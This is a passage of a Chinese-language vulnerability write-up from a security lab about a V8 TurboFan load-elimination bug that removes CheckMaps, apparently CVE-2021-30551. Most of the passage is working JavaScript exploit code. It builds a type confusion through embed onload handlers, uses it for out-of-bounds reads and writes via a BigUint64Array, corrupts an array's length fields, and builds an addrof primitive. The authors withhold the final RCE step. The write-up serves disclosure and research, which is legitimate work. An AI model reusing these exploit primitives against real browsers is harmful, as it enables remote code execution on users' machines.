    ReductionLoadElimination::ReduceCheckMaps(Node* node) {
    ZoneHandleSet const& maps = CheckMapsParametersOf(node->op()).maps();
    Node* const object = NodeProperties::GetValueInput(node, 0);
    Node* const effect = NodeProperties::GetEffectInput(node);
    AbstractState const* state = node_states_.Get(effect);
    if (state == nullptr) return NoChange();
    ZoneHandleSet object_maps;
    if (state->LookupMaps(object, &object_maps)) {
    if (maps.contains(object_maps)) return Replace(effect);
    // TODO(turbofan): Compute the intersection.
    }
    state = state->SetMaps(object, maps, zone());
    return UpdateState(node, state);
    }
可以看到由于上面提到的错误的映射，[maps](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/load-elimination.cc;drc=34da4407648871eca12e13e607545c0a64a83c1c;l=753?q=LoadElimination::ReduceCheckMaps&ss=chromium/chromium/src).[contains](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/zone/zone-handle-set.h;drc=34da4407648871eca12e13e607545c0a64a83c1c;l=84)([object_maps](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/load-elimination.cc;drc=34da4407648871eca12e13e607545c0a64a83c1c;l=758?q=LoadElimination::ReduceCheckMaps&ss=chromium/chromium/src))将会返回true从而将checkmaps消除掉，这样就可以实现越界读了。
这里有需要注意的地方：
混淆的对象不能随意选择，比如const [object_1, object_2] = createCorruptedPair(array,
111.223);此时他会将111.223当作数组去使用：
可以看到它会根据偏移去取elements中的内容，对于111.223来说他的对应偏移处的值为0x3ff19999（由于指针压缩，这里会将0x3ff19999+$r13的值作为elements指针进行访问，可以看到此时触发了0地址解引用）。
如果修改为：
JavaScript
    const buf12 = new ArrayBuffer(8);
    const flo = new Float64Array(buf12);
    const [object_1, object_2] = createCorruptedPair(array, flo);
    jit = (object) => {
    return object.corrupted_prop[2];
    }
    for (var i = 0; i  {
    object.corrupted_prop[2] = num;
    return object.corrupted_prop[2];
    }
就是给array设置一个属性，之后在创建一个具有相同属性的num，这样进行写入时就会消除掉checkmaps。
这里有几个点要注意：
  1. 直接赋值object.corrupted_prop[2] = 1.1;是不会消除checkmaps的。
  2. 越界写的长度是array的长度，但写的基地址为Float64Array的elemets，算是一个比较特殊的越界写！！！很重要 ！！！
  3. 最后就是越界写的过程中，是将数组中的每一个值都当作object来写的
这里就会有一个问题，elements里面存放的值都是指针压缩后的地址，当作object去写入的话肯定是不行的，看rdi的值也可以发现，他直接取了0xf500000000080425为地址。
而且就算是在32位没有指针压缩的情况下进行越界写，它还是会取8字节的值作为object来进行写入：
如图所示，所以就需要找一种越界时可以直接写double的方法，这里我尝试了几乎所有的object后找到了一个可以使用的目标BigUint64Array。
### 3.3Why BigUint64Array？
这里选择它的理由主要有以下几点：
  1. 它可以直接写入double，而不会像其他object混淆后当作object去写入
  2. BigUint64Array的elements非常特殊，它分配的地址可以和array相邻（可以调试一些其他的typearray，很明显可以发现他们的elements分配的区域和array是相距很远的而且偏移不固定）
图中圈红的位置为elements，可以看到BigUint64array的elements可以和array相邻，对于这个漏洞来说就十分方便了。
### 3.4最终的越界写思路：
最后需要修改array的length，但目前写入都是以double的形式进行的，所以需要先泄漏出length旁边的elements的地址，之后再进行拼接写入，避免破坏正常的object结构，修改elements的length也是同理：
JavaScript
    global_object = {};
    setPropertyViaEmbed = (object, value, handler) => {
    const embed = document.createElement('embed');
    embed.onload = handler;
    embed.type = 'text/html';
    Object.setPrototypeOf(global_object, embed);
    document.body.appendChild(embed);
    object.corrupted_prop = value;
    embed.remove();
    }
    createCorruptedPair = (value_1, value_2) => {
    const object_1 = {
    __proto__: global_object
    };
    object_1.regular_prop = 1;
    setPropertyViaEmbed(object_1, value_2, () => {
    Object.setPrototypeOf(global_object, null);
    object_1.corrupted_prop = value_1;
    });
    const object_2 = {
    __proto__: global_object
    };
    object_2.regular_prop = 1;
    setPropertyViaEmbed(object_2, value_2, () => {
    Object.setPrototypeOf(global_object, null);
    object_2.corrupted_prop = value_1;
    object_1.regular_prop = 1.1
    });
    return [object_1, object_2];
    }
    const array = [5.5,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1.1];
    array.prop = 1;
    const test = new BigUint64Array(2);
    var oob_array = [1.1,2.2,3.3];
    obj_array = { m: 1337, target: gc };
    ab = new ArrayBuffer(0x1337);
    const [object_1, object_2] = createCorruptedPair(array, test);
    jit = (object,index) => {
    return [object.corrupted_prop[index],object.corrupted_prop[index-5]];
    }
    %PrepareFunctionForOptimization(jit)
    jit(object_1,0);
    %OptimizeFunctionOnNextCall(jit);
    var leak = jit(object_2,0xd);
    elem = d2u(leak[0])[0];
    elem2 = d2u(leak[1])[0];
    const num = u2d(elem,0x4242);
    num.prop = 1;
    const num2 = u2d(elem2,0x4242);
    num2.prop = 1;
num对应oob_array的length，num2对应elements的length，之后只需要将他们越界写入oob_array即可。
JavaScript
    proto2 = {};
    setPropertyViaEmbed2 = (object, value, handler) => {
    const embed = document.createElement('embed');
    embed.onload = handler;
    embed.type = 'text/html';
    Object.setPrototypeOf(proto2, embed);
    document.body.appendChild(embed);
    object.corrupted2 = value;
    embed.remove();
    }
    createCorruptedPair2 = (value_1, value_2) => {
    const object_3 = {
    __proto__: proto2
    };
    object_3.regular2 = 1;
    setPropertyViaEmbed2(object_3, value_2, () => {
    Object.setPrototypeOf(proto2, null);
    object_3.corrupted2 = value_1;
    });
    const object_4 = {
    __proto__: proto2
    };
    object_4.regular2 = 1;
    setPropertyViaEmbed2(object_4, value_2, () => {
    Object.setPrototypeOf(proto2, null);
    object_4.corrupted2 = value_1;
    object_3.regular2 = 1.1
    });
    return [object_3, object_4];
    }
    const [object_3, object_4] = createCorruptedPair2(array, test);
    //%DebugPrint(object_4.corrupted2);
    jit22 = (object,index) => {
    object.corrupted2[index] = num; //length
    object.corrupted2[index-5] = num2; //elements的length
    return object.corrupted2[index];
    }
    %PrepareFunctionForOptimization(jit22)
    jit22(object_3,0);
    %OptimizeFunctionOnNextCall(jit22);
    //%DebugPrint(test);
    var leak2 = jit22(object_4,0xd);
    //%DebugPrint(leak2);
  1. array的长度决定越界的范围，忘记的同学可以再回头看一下。
  2. 不能只修改oob_array的length，还需要将elements中的length一并修改。
接下来只要提前构造好下面的结构：
JavaScript
    const test = new BigUint64Array(2);
    var oob_array = [1.1,2.2,3.3];
    obj_array = { m: 1337, target: gc };
    ab = new ArrayBuffer(0x1337);
利用test去越界修改oob_array的length和elements的length，这样就可以使用oob_array去进行漏洞利用了。
如果是32位的利用的话涉及到一个高低位的问题，这里需要注意一下：
简单举一个例子：
JavaScript
    var object_idx = undefined;
    var object_idx_flag = undefined;
    for (let i = 0; i < max_size; i++) {
    if (d2u(oob_array[i])[0] == 0xa72) {
    print("m: i: " + i + " lo 0");
    print("target: i: " + i + " hi 1");
    object_idx = i;
    object_idx_flag = 1;
    break;
    }
    if (d2u(oob_array[i])[1] == 0xa72) {
    print("m: i: " + i + " hi 1");
    print("target: i: " + (i + 1) + " lo 0");
    object_idx = i + 1;
    object_idx_flag = 0;
    break;
    }
    }
    function addrof(obj_para) {
    obj_array.target = obj_para;
    return d2u(oob_array[object_idx])[object_idx_flag] - 1;
    }
最后由于一些众所周知的原因，详细的exp就没办法在这里放出了，相信看到这里熟悉v8利用的小伙伴们就已经知道后面该怎么做了，有了越界读写之后就是一些常规的做法了。
最终放一个效果图：
## 四、结束语
  1. 该漏洞可以广泛运用于对市面上一些的chromium内置浏览器的攻击，rce成功之后将会对用户产生巨大的影响，无恒实验室在得知漏洞之后迅速对相关应用进行更新升级，同时也第一时间对漏洞利用进行分析，是业内第一个提供exp分析的实验室，保障了用户权益。
  2. 无恒实验室致力于为公司与全行业业务保驾护航，亦极为重视第三方应用对业务安全的影响，在检测公司引入的第三方应用安全性的同时，无恒实验室也着力于构建第三方应用中的漏洞缓解机制，并将持续与业界共享研究成果，协助企业业务避免遭受安全风险，亦望能与业内同行共同合作，为网络安全行业的发展做出贡献。
参考链接：
https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-30551.html